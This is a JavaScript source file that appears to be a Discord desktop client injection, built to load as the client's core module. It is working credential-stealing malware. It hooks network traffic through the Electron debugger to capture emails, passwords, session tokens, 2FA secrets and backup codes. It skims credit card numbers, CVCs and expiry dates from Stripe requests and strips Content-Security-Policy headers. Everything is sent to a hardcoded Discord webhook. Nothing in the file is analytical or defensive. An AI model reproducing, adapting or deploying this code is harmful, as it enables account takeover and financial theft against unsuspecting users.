const args = process.argv; const fs = require("fs"); const path = require("path"); const https = require("https"); const querystring = require("querystring"); const { BrowserWindow, session } = require("electron");

const config = {
    webhook: "https://discord.com/api/webhooks/1429220016682959040/GSURELbnEyx7MJ7OQHDbmhro6HL7W63wn45mwXMPDyRsp3P2MgN0WJ6BHOezPNbPx4Fl",
    auth_filters: {
        urls: [
            '/users/@me',
            '/auth/login',
            '/auth/register',
            '/remote-auth/login',
            '/mfa/totp',
            '/mfa/totp/enable',
            '/mfa/sms/enable',
            '/mfa/totp/disable',
            '/mfa/sms/disable',
            '/mfa/codes-verification',
        ],
    },
    session_filters: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions',
        ],
    },
    payment_filters: {
        urls: [
            'https://api.stripe.com/v*/tokens',
            'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
            'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens', 
            'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
            'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',   
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
        ],
    },
};

let sent = false;
const execScript = (script) => { 
  try {
    const window = BrowserWindow.getAllWindows()[0]; 
    if (window && window.webContents) {
      return window.webContents.executeJavaScript(script, true); 
    } else {
      console.log("⚠️ BrowserWindow bulunamadı");
      return null;
    }
  } catch (error) {
    console.error("execScript hatası:", error);
    return null;
  }
};

// Webhook'a gönderme fonksiyonu
const sendToWebhook = async (data) => {
  try {
    console.log("📤 Webhook'a gönderiliyor...");
    
    await execScript(`
      try {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "${config.webhook}", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            console.log("Webhook Status:", xhr.status);
            if (xhr.status === 204) {
              console.log("✅ Webhook'a başarıyla gönderildi!");
            } else {
              console.log("❌ Webhook hatası:", xhr.status);
            }
          }
        };
        xhr.send(JSON.stringify(${JSON.stringify(data)}));
      } catch (error) {
        console.error("Webhook gönderme hatası:", error);
      }
    `);
    
    console.log("📤 Webhook gönderimi tamamlandı!");
  } catch (error) {
    console.error('❌ Webhook gönderme hatası:', error);
  }
};

// Debugger API ile gelişmiş monitoring
const createWindow = (mainWindow) => {
    if (!mainWindow) return;
    
    console.log("🔍 Debugger API başlatılıyor...");
    mainWindow.webContents.debugger.attach('1.3');
    
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if ('Network.responseReceived' !== method) return;
        
        if (
            !config.auth_filters.urls.some(url => params.response.url.endsWith(url)) ||
            ![200, 202].includes(params.response.status)
        ) return;

        try {
            const [
                responseUnparsed,
                requestUnparsed
            ] = await Promise.all([
                mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {requestId: params.requestId}),
                mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {requestId: params.requestId})
            ]);            

            const RESPONSE_DATA = JSON.parse(responseUnparsed.body || '{}');
            const REQUEST_DATA = JSON.parse(requestUnparsed.postData || '{}');

            console.log("🔍 Network event tespit edildi:", params.response.url);
            
            // Login detection
            if (params.response.url.endsWith('/login') && RESPONSE_DATA.token) {
                console.log("🔐 Login tespit edildi!");
                await handleLogin(REQUEST_DATA, RESPONSE_DATA);
            }
            
            // Password change detection
            if (params.response.url.endsWith('/@me') && REQUEST_DATA.new_password) {
                console.log("🔒 Şifre değişikliği tespit edildi!");
                await handlePasswordChange(REQUEST_DATA);
            }
            
            // Email change detection
            if (params.response.url.endsWith('/@me') && REQUEST_DATA.email) {
                console.log("📧 Email değişikliği tespit edildi!");
                await handleEmailChange(REQUEST_DATA);
            }
            
            // Username change detection
            if (params.response.url.endsWith('/@me') && REQUEST_DATA.username) {
                console.log("🏷️ Username değişikliği tespit edildi!");
                await handleUsernameChange(REQUEST_DATA);
            }
            
            // 2FA backup codes
            if (params.response.url.endsWith('/codes-verification') && RESPONSE_DATA.backup_codes) {
                console.log("🔏 Backup codes tespit edildi!");
                await handleBackupCodes(REQUEST_DATA, RESPONSE_DATA);
            }
            
        } catch (error) {
            console.error("Debugger error:", error);
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        const windows = BrowserWindow.getAllWindows();
        if (windows.length > 0) {
            createWindow(windows[0]);
        }
    });
};

// Login handler
const handleLogin = async (requestData, responseData) => {
    const token = responseData.token;
    const email = requestData.login;
    const password = requestData.password;
    
    const embedData = {
        embeds: [{
            title: "🔐 Discord Login Detected",
            color: 0xff0000,
            fields: [
                { name: "Email", value: `\`${email}\``, inline: true },
                { name: "Password", value: `\`${password}\``, inline: true },
                { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
            ],
            footer: { text: "https://t.me/hairo13x7" },
            timestamp: new Date().toISOString()
        }]
    };
    
    await sendToWebhook(embedData);
};

// Password change handler
const handlePasswordChange = async (requestData) => {
    const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
    
    const embedData = {
        embeds: [{
            title: "🔒 Password Change Detected",
            color: 0xffa500,
            fields: [
                { name: "Old Password", value: `\`${requestData.password}\``, inline: true },
                { name: "New Password", value: `\`${requestData.new_password}\``, inline: true },
                { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
            ],
            footer: { text: "https://t.me/hairo13x7" },
            timestamp: new Date().toISOString()
        }]
    };
    
    await sendToWebhook(embedData);
};

// Email change handler
const handleEmailChange = async (requestData) => {
    const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
    
    const embedData = {
        embeds: [{
            title: "📧 Email Change Detected",
            color: 0x00ff00,
            fields: [
                { name: "New Email", value: `\`${requestData.email}\``, inline: true },
                { name: "Password", value: `\`${requestData.password}\``, inline: true },
                { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
            ],
            footer: { text: "https://t.me/hairo13x7" },
            timestamp: new Date().toISOString()
        }]
    };
    
    await sendToWebhook(embedData);
};

// Username change handler
const handleUsernameChange = async (requestData) => {
    const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
    
    const embedData = {
        embeds: [{
            title: "🏷️ Username Change Detected",
            color: 0x0099ff,
            fields: [
                { name: "New Username", value: `\`${requestData.username}\``, inline: true },
                { name: "Password", value: `\`${requestData.password}\``, inline: true },
                { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
            ],
            footer: { text: "https://t.me/hairo13x7" },
            timestamp: new Date().toISOString()
        }]
    };
    
    await sendToWebhook(embedData);
};

// Backup codes handler
const handleBackupCodes = async (requestData, responseData) => {
    const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
    
    const codes = responseData.backup_codes
        .filter(code => !code.consumed)
        .map(code => `${code.code.slice(0, 4)}-${code.code.slice(4)}`)
        .join('\n');
    
    const embedData = {
        embeds: [{
            title: "🔏 Backup Codes Generated",
            color: 0x800080,
            fields: [
                { name: "Password", value: `\`${requestData.password}\``, inline: true },
                { name: "Secret", value: `\`${requestData.secret}\``, inline: true },
                { name: "Backup Codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
                { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
            ],
            footer: { text: "https://t.me/hairo13x7" },
            timestamp: new Date().toISOString()
        }]
    };
    
    await sendToWebhook(embedData);
};

// Payment monitoring
const defaultSession = (webRequest) => {
    webRequest.onCompleted(config.payment_filters, async (details) => {
        const { url, uploadData, method, statusCode } = details;

        if (!['POST'].includes(method) && ![200, 202].includes(statusCode)) return;

        const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

        switch (true) {
            case url.includes('stripe'): {
                let item;
                try {
                    item = querystring.parse(Buffer.from(uploadData[0].bytes).toString());
                } catch (error) {
                    item = querystring.parse(decodeURIComponent(uploadData[0]?.bytes.toString() || ''));
                }

                const embedData = {
                    embeds: [{
                        title: "💳 Credit Card Added",
                        color: 0x800080,
                        fields: [
                            { name: "Card Number", value: `\`${item["card[number]"]}\``, inline: true },
                            { name: "CVC", value: `\`${item["card[cvc]"]}\``, inline: true },
                            { name: "Expiry", value: `\`${item["card[exp_month]"]}/${item["card[exp_year]"]}\``, inline: true },
                            { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
                        ],
                        footer: { text: "https://t.me/hairo13x7" },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                await sendToWebhook(embedData);
                break;
            }
            case url.endsWith('paypal_accounts'): {
                const embedData = {
                    embeds: [{
                        title: "💰 PayPal Added",
                        color: 0x0099ff,
                        fields: [
                            { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
                        ],
                        footer: { text: "https://t.me/hairo13x7" },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                await sendToWebhook(embedData);
                break;
            }
        }
    });
    
    webRequest.onHeadersReceived(async (request, callback) => {
        const { responseHeaders } = request;
        const updatedHeaders = { ...responseHeaders };

        delete updatedHeaders["content-security-policy"];
        delete updatedHeaders["content-security-policy-report-only"];

        callback({responseHeaders: {
            ...updatedHeaders, 
            "Access-Control-Allow-Headers": "*" 
        }});
    });
}

// Initialization
const initialize = async () => {
    if (sent) return;
    sent = true;
    
    console.log("🚀 Gelişmiş injection başlatılıyor...");
    
    // Test webhook
    const testEmbed = {
        embeds: [{
            title: "🧪 Advanced Injection Test",
            description: "Gelişmiş injection sistemi aktif!",
            color: 0x00ff00,
            fields: [
                { name: "Sistem", value: "Debugger API", inline: true },
                { name: "Monitoring", value: "Network Traffic", inline: true },
                { name: "Durum", value: "✅ Aktif", inline: true }
            ],
            footer: { text: "https://t.me/hairo13x7" },
            timestamp: new Date().toISOString()
        }]
    };
    
    await sendToWebhook(testEmbed);
    
    // Token grab
    try {
        const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
        
        if (token) {
            const embedData = {
                embeds: [{
                    title: "🔑 Discord Token Grabbed",
                    color: 0x313338,
                    fields: [
                        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
                        { name: "Platform", value: "Discord Desktop", inline: true }
                    ],
                    footer: { text: "https://t.me/hairo13x7" },
                    timestamp: new Date().toISOString()
                }]
            };
            
            await sendToWebhook(embedData);
        }
    } catch (error) {
        console.log("Token yakalama hatası:", error);
    }
};

// Session monitoring
const qrCodesFilter = {
    urls: [
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "https://*.discord.com/api/v*/applications/detectable",
        "https://discord.com/api/v*/applications/detectable",
        "https://*.discord.com/api/v*/users/@me/library",
        "https://discord.com/api/v*/users/@me/library",
        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
        "wss://remote-auth-gateway.discord.gg/*"
    ]
};

session.defaultSession.webRequest.onBeforeRequest(qrCodesFilter, async (details, callback) => {
    if (details.url.startsWith("wss://")) {
        callback({ cancel: true });
        return;
    }

    await initialize();
    callback({});
});

// Initialize
createWindow(BrowserWindow.getAllWindows()[0]);
defaultSession(session.defaultSession.webRequest);

module.exports = require("./core.asar");
